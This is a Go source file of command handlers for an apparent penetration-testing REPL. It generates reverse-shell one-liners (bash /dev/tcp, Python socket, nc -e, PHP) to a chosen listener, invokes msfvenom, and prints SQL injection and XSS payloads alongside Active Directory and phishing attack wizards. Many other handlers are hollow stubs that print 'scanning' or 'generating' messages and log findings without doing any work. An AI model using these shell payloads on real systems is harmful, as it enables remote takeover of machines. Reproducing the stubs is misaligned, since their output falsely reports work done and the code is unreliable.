func (r *REPL) cmdSupplySBOM(args []string) error {
	dir := "."
	if len(args) > 0 {
		dir = args[0]
	}
	fmt.Fprintf(os.Stdout, "\n\033[1;36mgenerating SBOM for %s:\033[0m\n", dir)
	fmt.Fprintf(os.Stdout, "  scanning dependencies...\n")
	fmt.Fprintf(os.Stdout, "  generating CycloneDX SBOM...\n")
	r.AddFinding("supply_sbom", "info", fmt.Sprintf("SBOM generated for %s", dir))
	return nil
}

func (r *REPL) cmdSupplyLicense(args []string) error {
	dir := "."
	if len(args) > 0 {
		dir = args[0]
	}
	fmt.Fprintf(os.Stdout, "\n\033[1;36mlicense compliance for %s:\033[0m\n", dir)
	fmt.Fprintf(os.Stdout, "  scanning file licenses...\n")
	fmt.Fprintf(os.Stdout, "  checking compatibility...\n")
	r.AddFinding("supply_license", "info", fmt.Sprintf("license compliance for %s", dir))
	return nil
}

func (r *REPL) cmdDeobfuscate(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: deobfuscate <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mJavaScript deobfuscation for %s:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  analyzing obfuscation patterns...\n")
	fmt.Fprintf(os.Stdout, "  decoding strings...\n")
	r.AddFinding("deobfuscate", "info", fmt.Sprintf("deobfuscation for %s", file))
	return nil
}

func (r *REPL) cmdDecodeBase64(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: decode-base64 <data>")
	}
	data := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mbase64 decode:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  input: %s\n", data)
	r.AddFinding("decode_base64", "info", "base64 decode")
	return nil
}

func (r *REPL) cmdDecodeHex(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: decode-hex <data>")
	}
	data := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mhex decode:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  input: %s\n", data)
	r.AddFinding("decode_hex", "info", "hex decode")
	return nil
}

func (r *REPL) cmdDecodeURL(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: decode-url <data>")
	}
	data := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mURL decode:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  input: %s\n", data)
	r.AddFinding("decode_url", "info", "URL decode")
	return nil
}

func (r *REPL) cmdEncodeBase64(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: encode-base64 <data>")
	}
	data := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mbase64 encode:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  input: %s\n", data)
	r.AddFinding("encode_base64", "info", "base64 encode")
	return nil
}

func (r *REPL) cmdEncodeURL(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: encode-url <data>")
	}
	data := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mURL encode:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  input: %s\n", data)
	r.AddFinding("encode_url", "info", "URL encode")
	return nil
}

func (r *REPL) cmdEncodeXOR(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: encode-xor <data> <key>")
	}
	data := args[0]
	key := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mXOR encode:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  data: %s\n", data)
	fmt.Fprintf(os.Stdout, "  key:  %s\n", key)
	r.AddFinding("encode_xor", "info", fmt.Sprintf("XOR encode with key %s", key))
	return nil
}

func (r *REPL) cmdWizardPentest(args []string) error {
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;36m=== GUIDED PENETRATION TEST WIZARD ===\033[0m")
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;37mPhase 1: Reconnaissance\033[0m")
	fmt.Fprintln(os.Stdout, "  1. Set target: target <domain>")
	fmt.Fprintln(os.Stdout, "  2. Run recon: recon full")
	fmt.Fprintln(os.Stdout, "  3. Review subdomains: recon subdomains")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 2: Scanning\033[0m")
	fmt.Fprintln(os.Stdout, "  4. Port scan: recon ports")
	fmt.Fprintln(os.Stdout, "  5. Technology fingerprint: recon tech")
	fmt.Fprintln(os.Stdout, "  6. Directory brute-force: recon dirs")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 3: Exploitation\033[0m")
	fmt.Fprintln(os.Stdout, "  7. Vulnerability scan: scan all")
	fmt.Fprintln(os.Stdout, "  8. SQL injection: scan sqli")
	fmt.Fprintln(os.Stdout, "  9. XSS testing: scan xss")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 4: Post-Exploitation\033[0m")
	fmt.Fprintln(os.Stdout, "  10. Privilege escalation: linpeas")
	fmt.Fprintln(os.Stdout, "  11. Credential testing: scan creds")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 5: Reporting\033[0m")
	fmt.Fprintln(os.Stdout, "  12. Generate report: report generate")
	fmt.Fprintln(os.Stdout, "  13. Export: report export md")
	return nil
}

func (r *REPL) cmdWizardWebapp(args []string) error {
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;36m=== GUIDED WEB APP WIZARD ===\033[0m")
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;37mPhase 1: Discovery\033[0m")
	fmt.Fprintln(os.Stdout, "  1. Set target: target <url>")
	fmt.Fprintln(os.Stdout, "  2. Technology recon: recon tech")
	fmt.Fprintln(os.Stdout, "  3. Directory discovery: recon dirs")
	fmt.Fprintln(os.Stdout, "  4. Parameter discovery: recon params")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 2: Analysis\033[0m")
	fmt.Fprintln(os.Stdout, "  5. Header audit: scan headers")
	fmt.Fprintln(os.Stdout, "  6. SSL audit: scan ssl")
	fmt.Fprintln(os.Stdout, "  7. CORS test: scan cors")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 3: Exploitation\033[0m")
	fmt.Fprintln(os.Stdout, "  8. SQL injection: scan sqli")
	fmt.Fprintln(os.Stdout, "  9. XSS testing: scan xss")
	fmt.Fprintln(os.Stdout, "  10. SSRF test: scan ssrf")
	fmt.Fprintln(os.Stdout, "  11. IDOR test: scan idor")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 4: Reporting\033[0m")
	fmt.Fprintln(os.Stdout, "  12. Generate report: report generate")
	return nil
}

func (r *REPL) cmdWizardAD(args []string) error {
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;36m=== GUIDED ACTIVE DIRECTORY WIZARD ===\033[0m")
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;37mPhase 1: Enumeration\033[0m")
	fmt.Fprintln(os.Stdout, "  1. Set target: target <domain>")
	fmt.Fprintln(os.Stdout, "  2. LDAP enumeration: ldap-dump")
	fmt.Fprintln(os.Stdout, "  3. SMB enumeration: smb-shares")
	fmt.Fprintln(os.Stdout, "  4. BloodHound collection: bloodhound")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 2: Credential Attacks\033[0m")
	fmt.Fprintln(os.Stdout, "  5. AS-REP roasting: impacket GetNPUsers")
	fmt.Fprintln(os.Stdout, "  6. Kerberoasting: impacket GetUserSPNs")
	fmt.Fprintln(os.Stdout, "  7. Password spray: spray")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 3: Lateral Movement\033[0m")
	fmt.Fprintln(os.Stdout, "  8. CrackMapExec: cme")
	fmt.Fprintln(os.Stdout, "  9. Pass-the-Hash: impacket psexec")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 4: Reporting\033[0m")
	fmt.Fprintln(os.Stdout, "  10. Generate report: report generate")
	return nil
}

func (r *REPL) cmdWizardCreds(args []string) error {
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;36m=== GUIDED CREDENTIAL WIZARD ===\033[0m")
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;37mPhase 1: Discovery\033[0m")
	fmt.Fprintln(os.Stdout, "  1. Set target: target <host>")
	fmt.Fprintln(os.Stdout, "  2. Scan for default creds: scan creds")
	fmt.Fprintln(os.Stdout, "  3. Generate wordlist: cewl <target>")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 2: Brute Force\033[0m")
	fmt.Fprintln(os.Stdout, "  4. Hydra brute force: hydra <host> <port> <service> <users> <passes>")
	fmt.Fprintln(os.Stdout, "  5. Password spray: spray <hosts> <users> <passes> <service>")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 3: Hash Cracking\033[0m")
	fmt.Fprintln(os.Stdout, "  6. John the Ripper: john <hashfile>")
	fmt.Fprintln(os.Stdout, "  7. Hashcat: hashcat <hashfile> <type> <wordlist>")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 4: Reporting\033[0m")
	fmt.Fprintln(os.Stdout, "  8. Generate report: report generate")
	return nil
}

func (r *REPL) cmdWizardReport(args []string) error {
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;36m=== GUIDED REPORT WIZARD ===\033[0m")
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;37mPhase 1: Review\033[0m")
	fmt.Fprintln(os.Stdout, "  1. Check findings: export json")
	fmt.Fprintln(os.Stdout, "  2. Add notes: notes add <note>")
	fmt.Fprintln(os.Stdout, "  3. Add bookmarks: bookmark add <url>")
	fmt.Fprintln(os.Stdout, "\n\033[1;37mPhase 2: Generate\033[0m")
	fmt.Fprintln(os.Stdout, "  4. Create report: report generate")
	fmt.Fprintln(os.Stdout, "  5. Export markdown: report export md")
	fmt.Fprintln(os.Stdout, "  6. Export HTML: report export html")
	fmt.Fprintln(os.Stdout, "  7. Export JSON: report export json")
	return nil
}

func (r *REPL) cmdChainWebRCE(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36mbuilding web-to-RCE attack chain:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  [1] Reconnaissance: subdomains + ports + tech\n")
	fmt.Fprintf(os.Stdout, "  [2] Web scanning: headers + ssl + cors\n")
	fmt.Fprintf(os.Stdout, "  [3] Vulnerability discovery: nuclei + sqli + xss\n")
	fmt.Fprintf(os.Stdout, "  [4] Exploitation: SSRF/RCE chain\n")
	fmt.Fprintf(os.Stdout, "  [5] Post-exploitation: privesc\n")
	r.AddFinding("chain_web_rce", "high", "web-to-RCE attack chain")
	return nil
}

func (r *REPL) cmdChainPhishDA(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36mbuilding phishing-to-domain-admin chain:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  [1] Target enumeration: emails + domains\n")
	fmt.Fprintf(os.Stdout, "  [2] Phishing infrastructure: landing page + emails\n")
	fmt.Fprintf(os.Stdout, "  [3] Credential harvesting\n")
	fmt.Fprintf(os.Stdout, "  [4] Internal recon: LDAP + BloodHound\n")
	fmt.Fprintf(os.Stdout, "  [5] Privilege escalation to DA\n")
	r.AddFinding("chain_phish_da", "critical", "phishing-to-DA attack chain")
	return nil
}

func (r *REPL) cmdChainWebData(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36mbuilding web-to-data-exfiltration chain:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  [1] Web app recon: dirs + params + JS\n")
	fmt.Fprintf(os.Stdout, "  [2] Vulnerability scan: IDOR + SSRF + sqli\n")
	fmt.Fprintf(os.Stdout, "  [3] Data discovery: internal APIs + databases\n")
	fmt.Fprintf(os.Stdout, "  [4] Exfiltration path validation\n")
	r.AddFinding("chain_web_data", "high", "web-to-data-exfiltration chain")
	return nil
}

func (r *REPL) cmdChainList(args []string) error {
	fmt.Fprintln(os.Stdout, "\n\033[1;36mavailable attack chains:\033[0m")
	fmt.Fprintln(os.Stdout, "  \033[32mweb-rce\033[0m    web-to-RCE chain")
	fmt.Fprintln(os.Stdout, "  \033[32mphish-da\033[0m   phishing-to-domain-admin chain")
	fmt.Fprintln(os.Stdout, "  \033[32mweb-data\033[0m   web-to-data-exfiltration chain")
	return nil
}

func (r *REPL) cmdChainVisualize(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: chain-visualize <name>")
	}
	name := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mvisualizing attack chain: %s\033[0m\n", name)
	fmt.Fprintf(os.Stdout, "\n  [START] --> [RECON] --> [SCAN] --> [EXPLOIT] --> [POST-EXPLOIT] --> [DATA]\n")
	r.AddFinding("chain_visualize", "info", fmt.Sprintf("visualized chain: %s", name))
	return nil
}

func (r *REPL) cmdPayloadReverse(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("usage: payload reverse <proto> <lhost> <lport>")
	}
	proto := args[0]
	lhost := args[1]
	lport := args[2]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mreverse shell payload:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  protocol: %s\n", proto)
	fmt.Fprintf(os.Stdout, "  lhost:    %s\n", lhost)
	fmt.Fprintf(os.Stdout, "  lport:    %s\n", lport)
	switch proto {
	case "bash":
		fmt.Fprintf(os.Stdout, "  payload:  bash -i >& /dev/tcp/%s/%s 0>&1\n", lhost, lport)
	case "python":
		fmt.Fprintf(os.Stdout, "  payload:  python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"%s\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'\n", lhost, lport)
	case "nc":
		fmt.Fprintf(os.Stdout, "  payload:  nc -e /bin/sh %s %s\n", lhost, lport)
	case "php":
		fmt.Fprintf(os.Stdout, "  payload:  php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n", lhost, lport)
	default:
		fmt.Fprintf(os.Stdout, "  payload:  [%s reverse shell to %s:%s]\n", proto, lhost, lport)
	}
	r.AddFinding("payload_reverse", "critical", fmt.Sprintf("reverse shell %s://%s:%s", proto, lhost, lport))
	return nil
}

func (r *REPL) cmdPayloadBind(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: payload bind <proto> <lport>")
	}
	proto := args[0]
	lport := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mbind shell payload:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  protocol: %s\n", proto)
	fmt.Fprintf(os.Stdout, "  port:     %s\n", lport)
	r.AddFinding("payload_bind", "critical", fmt.Sprintf("bind shell %s on port %s", proto, lport))
	return nil
}

func (r *REPL) cmdPayloadMSFVenom(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("usage: payload msfvenom <type> <lhost> <lport>")
	}
	payloadType := args[0]
	lhost := args[1]
	lport := args[2]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mMeterpreter payload:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  type:   %s\n", payloadType)
	fmt.Fprintf(os.Stdout, "  lhost:  %s\n", lhost)
	fmt.Fprintf(os.Stdout, "  lport:  %s\n", lport)
	if _, err := exec.LookPath("msfvenom"); err == nil {
		return runTool("msfvenom", "-p", payloadType, fmt.Sprintf("LHOST=%s", lhost), fmt.Sprintf("LPORT=%s", lport), "-f", "raw")
	}
	fmt.Fprintf(os.Stdout, "  msfvenom not found\n")
	r.AddFinding("payload_msfvenom", "critical", fmt.Sprintf("meterpreter %s://%s:%s", payloadType, lhost, lport))
	return nil
}

func (r *REPL) cmdPayloadWebshell(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: payload webshell <type> <password>")
	}
	shellType := args[0]
	password := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mweb shell payload:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  type:     %s\n", shellType)
	fmt.Fprintf(os.Stdout, "  password: %s\n", password)
	r.AddFinding("payload_webshell", "critical", fmt.Sprintf("web shell %s with password", shellType))
	return nil
}

func (r *REPL) cmdPayloadSQLi(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: payload sqli <db> <technique>")
	}
	db := args[0]
	technique := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mSQL injection payload:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  db:         %s\n", db)
	fmt.Fprintf(os.Stdout, "  technique:  %s\n", technique)
	switch technique {
	case "union":
		fmt.Fprintf(os.Stdout, "  payload: ' UNION SELECT NULL,NULL,NULL-- -\n")
	case "blind":
		fmt.Fprintf(os.Stdout, "  payload: ' AND 1=1-- -\n")
	case "time":
		fmt.Fprintf(os.Stdout, "  payload: ' OR SLEEP(5)-- -\n")
	case "error":
		fmt.Fprintf(os.Stdout, "  payload: ' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- -\n")
	default:
		fmt.Fprintf(os.Stdout, "  payload: [%s technique for %s]\n", technique, db)
	}
	r.AddFinding("payload_sqli", "critical", fmt.Sprintf("SQLi %s on %s", technique, db))
	return nil
}

func (r *REPL) cmdPayloadXSS(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: payload xss <context>")
	}
	context := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mXSS payload:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  context: %s\n", context)
	switch context {
	case "html":
		fmt.Fprintf(os.Stdout, "  payload: <script>alert(1)</script>\n")
	case "attr":
		fmt.Fprintf(os.Stdout, "  payload: \" onmouseover=alert(1) \"\n")
	case "js":
		fmt.Fprintf(os.Stdout, "  payload: '-alert(1)-'\n")
	case "svg":
		fmt.Fprintf(os.Stdout, "  payload: <svg onload=alert(1)>\n")
	default:
		fmt.Fprintf(os.Stdout, "  payload: [<context-aware XSS for %s>]\n", context)
	}
	r.AddFinding("payload_xss", "high", fmt.Sprintf("XSS payload for %s context", context))
	return nil
}

func (r *REPL) cmdSessionRecordStart(args []string) error {
	fmt.Fprintln(os.Stdout, "\n\033[1;36msession recording started\033[0m")
	fmt.Fprintln(os.Stdout, "  all commands will be logged")
	r.AddFinding("session_record", "info", "session recording started")
	return nil
}

func (r *REPL) cmdSessionRecordStop(args []string) error {
	fmt.Fprintln(os.Stdout, "\n\033[1;36msession recording stopped\033[0m")
	r.AddFinding("session_record", "info", "session recording stopped")
	return nil
}

func (r *REPL) cmdSessionReplay(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: session-replay <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mreplaying session from %s:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  loading session data...\n")
	r.AddFinding("session_replay", "info", fmt.Sprintf("replaying session from %s", file))
	return nil
}

func (r *REPL) cmdSessionStats(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: session-stats <file>")
	}
	fmt.Fprintf(os.Stdout, "\n\033[1;36msession statistics:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  total commands:   %d\n", len(r.history))
	fmt.Fprintf(os.Stdout, "  total findings:   %d\n", len(r.session.Findings))
	fmt.Fprintf(os.Stdout, "  total notes:      %d\n", len(r.session.Notes))
	fmt.Fprintf(os.Stdout, "  total bookmarks:  %d\n", len(r.session.Bookmarks))
	return nil
}

func (r *REPL) cmdContext(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36mcurrent context:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  target:   %s\n", r.target)
	fmt.Fprintf(os.Stdout, "  profile:  %s\n", r.profile)
	fmt.Fprintf(os.Stdout, "  findings: %d\n", len(r.session.Findings))
	fmt.Fprintf(os.Stdout, "  notes:    %d\n", len(r.session.Notes))
	fmt.Fprintf(os.Stdout, "  bookmarks: %d\n", len(r.session.Bookmarks))
	if len(r.session.Findings) > 0 {
		fmt.Fprintf(os.Stdout, "\n  \033[1;37mlast finding:\033[0m\n")
		last := r.session.Findings[len(r.session.Findings)-1]
		fmt.Fprintf(os.Stdout, "    [%s] %s: %s\n", last.Severity, last.Title, last.Detail)
	}
	return nil
}

func (r *REPL) cmdContextAttackSurface(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36mattack surface:\033[0m\n")
	if r.target == "" {
		fmt.Fprintln(os.Stdout, "  no target set")
		return nil
	}
	fmt.Fprintf(os.Stdout, "  target: %s\n", r.target)
	fmt.Fprintf(os.Stdout, "  findings by severity:\n")
	sevCount := map[string]int{}
	for _, f := range r.session.Findings {
		sevCount[f.Severity]++
	}
	for _, sev := range []string{"critical", "high", "medium", "low", "info"} {
		if count, ok := sevCount[sev]; ok {
			fmt.Fprintf(os.Stdout, "    %-10s %d\n", sev, count)
		}
	}
	return nil
}

func (r *REPL) cmdContextNextSteps(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36msuggested next steps:\033[0m\n")
	if r.target == "" {
		fmt.Fprintln(os.Stdout, "  1. Set a target: target <url>")
		return nil
	}
	fmt.Fprintf(os.Stdout, "  1. Review findings: export json\n")
	fmt.Fprintf(os.Stdout, "  2. Add notes: notes add <observation>\n")
	fmt.Fprintf(os.Stdout, "  3. Generate report: report generate\n")
	fmt.Fprintf(os.Stdout, "  4. Export report: report export md\n")
	return nil
}

func (r *REPL) cmdContextRisk(args []string) error {
	fmt.Fprintf(os.Stdout, "\n\033[1;36mrisk profile:\033[0m\n")
	if len(r.session.Findings) == 0 {
		fmt.Fprintln(os.Stdout, "  no findings yet")
		return nil
	}
	critical := 0
	high := 0
	medium := 0
	low := 0
	for _, f := range r.session.Findings {
		switch f.Severity {
		case "critical":
			critical++
		case "high":
			high++
		case "medium":
			medium++
		case "low":
			low++
		}
	}
	riskScore := critical*10 + high*5 + medium*2 + low
	fmt.Fprintf(os.Stdout, "  critical: %d\n", critical)
	fmt.Fprintf(os.Stdout, "  high:     %d\n", high)
	fmt.Fprintf(os.Stdout, "  medium:   %d\n", medium)
	fmt.Fprintf(os.Stdout, "  low:      %d\n", low)
	fmt.Fprintf(os.Stdout, "  risk score: %d\n", riskScore)
	return nil
}

func (r *REPL) cmdNoteAdd(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: note-add <title>")
	}
	title := strings.Join(args, " ")
	r.AddNote(title)
	fmt.Fprintf(os.Stdout, "note added: %s\n", title)
	return nil
}

func (r *REPL) cmdNoteList(args []string) error {
	notes := r.loadNotes()
	if len(notes) == 0 {
		fmt.Fprintln(os.Stdout, "no notes")
		return nil
	}
	fmt.Fprintln(os.Stdout, "\n\033[1;37mnotes:\033[0m")
	for i, n := range notes {
		fmt.Fprintf(os.Stdout, "  %d. %s\n", i+1, n)
	}
	return nil
}

func (r *REPL) cmdNoteSearch(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: note-search <query>")
	}
	query := strings.Join(args, " ")
	notes := r.loadNotes()
	found := false
	for i, n := range notes {
		if strings.Contains(strings.ToLower(n), strings.ToLower(query)) {
			fmt.Fprintf(os.Stdout, "  %d. %s\n", i+1, n)
			found = true
		}
	}
	if !found {
		fmt.Fprintln(os.Stdout, "no matching notes")
	}
	return nil
}

func (r *REPL) cmdBookmarkAdd(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: bookmark-add <url> [title]")
	}
	url := args[0]
	r.AddBookmark(url)
	fmt.Fprintf(os.Stdout, "bookmark added: %s\n", url)
	return nil
}

func (r *REPL) cmdBookmarkList(args []string) error {
	bookmarks := r.loadBookmarks()
	if len(bookmarks) == 0 {
		fmt.Fprintln(os.Stdout, "no bookmarks")
		return nil
	}
	fmt.Fprintln(os.Stdout, "\n\033[1;37mbookmarks:\033[0m")
	for i, b := range bookmarks {
		fmt.Fprintf(os.Stdout, "  %d. %s\n", i+1, b)
	}
	return nil
}

func (r *REPL) cmdBookmarkSearch(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: bookmark-search <query>")
	}
	query := strings.Join(args, " ")
	bookmarks := r.loadBookmarks()
	found := false
	for i, b := range bookmarks {
		if strings.Contains(strings.ToLower(b), strings.ToLower(query)) {
			fmt.Fprintf(os.Stdout, "  %d. %s\n", i+1, b)
			found = true
		}
	}
	if !found {
		fmt.Fprintln(os.Stdout, "no matching bookmarks")
	}
	return nil
}

func (r *REPL) cmdRulesScan(args []string) error {
	if len(args) < 2 {
		return fmt.Errorf("usage: rules-scan <file> <ruleset>")
	}
	file := args[0]
	ruleset := args[1]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mscanning %s with ruleset %s:\033[0m\n", file, ruleset)
	fmt.Fprintf(os.Stdout, "  loading rules...\n")
	fmt.Fprintf(os.Stdout, "  scanning file...\n")
	r.AddFinding("rules_scan", "info", fmt.Sprintf("scanned %s with %s", file, ruleset))
	return nil
}

func (r *REPL) cmdPatternsScan(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: patterns-scan <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mscanning %s for patterns:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  checking for known patterns...\n")
	r.AddFinding("patterns_scan", "info", fmt.Sprintf("pattern scan for %s", file))
	return nil
}

func (r *REPL) cmdPatternsSecrets(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: patterns-secrets <file>")
	}
	file := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36mdetecting secrets in %s:\033[0m\n", file)
	fmt.Fprintf(os.Stdout, "  scanning for API keys...\n")
	fmt.Fprintf(os.Stdout, "  scanning for passwords...\n")
	fmt.Fprintf(os.Stdout, "  scanning for tokens...\n")
	r.AddFinding("patterns_secrets", "info", fmt.Sprintf("secret detection for %s", file))
	return nil
}

func (r *REPL) cmdEnrichIP(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: enrich-ip <ip>")
	}
	ip := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36menriching IP %s:\033[0m\n", ip)
	fmt.Fprintf(os.Stdout, "  checking GeoIP...\n")
	fmt.Fprintf(os.Stdout, "  checking threat intelligence...\n")
	fmt.Fprintf(os.Stdout, "  checking reverse DNS...\n")
	r.AddFinding("enrich_ip", "info", fmt.Sprintf("IP enrichment for %s", ip))
	return nil
}

func (r *REPL) cmdEnrichDomain(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: enrich-domain <domain>")
	}
	domain := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36menriching domain %s:\033[0m\n", domain)
	fmt.Fprintf(os.Stdout, "  checking WHOIS...\n")
	fmt.Fprintf(os.Stdout, "  checking DNS records...\n")
	fmt.Fprintf(os.Stdout, "  checking threat intelligence...\n")
	r.AddFinding("enrich_domain", "info", fmt.Sprintf("domain enrichment for %s", domain))
	return nil
}

func (r *REPL) cmdEnrichURL(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: enrich-url <url>")
	}
	url := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36menriching URL %s:\033[0m\n", url)
	fmt.Fprintf(os.Stdout, "  checking reputation...\n")
	fmt.Fprintf(os.Stdout, "  checking screenshots...\n")
	r.AddFinding("enrich_url", "info", fmt.Sprintf("URL enrichment for %s", url))
	return nil
}

func (r *REPL) cmdEnrichCVE(args []string) error {
	if len(args) < 1 {
		return fmt.Errorf("usage: enrich-cve <id>")
	}
	cveID := args[0]
	fmt.Fprintf(os.Stdout, "\n\033[1;36menriching %s:\033[0m\n", cveID)
	fmt.Fprintf(os.Stdout, "  fetching NVD data...\n")
	fmt.Fprintf(os.Stdout, "  checking exploits...\n")
	fmt.Fprintf(os.Stdout, "  checking CVSS score...\n")
	r.AddFinding("enrich_cve", "info", fmt.Sprintf("CVE enrichment for %s", cveID))
	return nil
}

func (r *REPL) cmdDashboard(args []string) error {
	fmt.Fprintln(os.Stdout)
	fmt.Fprintln(os.Stdout, "\033[1;36m=== LIVE DASHBOARD ===\033[0m")
	fmt.Fprintln(os.Stdout)
	fmt.Fprintf(os.Stdout, "  target:     %s\n", r.target)
	fmt.Fprintf(os.Stdout, "  profile:    %s\n", r.profile)
	fmt.Fprintf(os.Stdout, "  findings:   %d\n", len(r.session.Findings))
	fmt.Fprintf(os.Stdout, "  notes:      %d\n", len(r.session.Notes))
	fmt.Fprintf(os.Stdout, "  bookmarks:  %d\n", len(r.session.Bookmarks))
	fmt.Fprintf(os.Stdout, "  history:    %d commands\n", len(r.history))
	if len(r.session.Findings) > 0 {
		fmt.Fprintln(os.Stdout, "\n  \033[1;37mlast 5 findings:\033[0m")
		start := 0
		if len(r.session.Findings) > 5 {
			start = len(r.session.Findings) - 5
		}
		for _, f := range r.session.Findings[start:] {
			fmt.Fprintf(os.Stdout, "    [%s] %s\n", f.Severity, f.Title)
		}
	}
	return nil
}

func (r *REPL) cmdScheduleAdd(args []string) error {
	if len(args) < 3 {
		return fmt.Errorf("usage: schedule-add <name> <target> <cron>")
	}
	name := args[0]
	target := args[1]
	cron := args[2]
	fmt.Fprintf(os.Stdout, "\n\033[1;36madding scheduled scan:\033[0m\n")
	fmt.Fprintf(os.Stdout, "  name:   %s\n", name)
	fmt.Fprintf(os.Stdout, "  target: %s\n", target)
	fmt.Fprintf(os.Stdout, "  cron:   %s\n", cron)
	r.AddFinding("schedule_add", "info", fmt.Sprintf("scheduled scan %s for %s", name, target))
	return nil
}

func (r *REPL) cmdScheduleList(args []string) error {
	fmt.Fprintln(os.Stdout, "\n\033[1;36mscheduled scans:\033[0m")
	fmt.Fprintln(os.Stdout, "  (no scheduled scans)")
	return nil
}

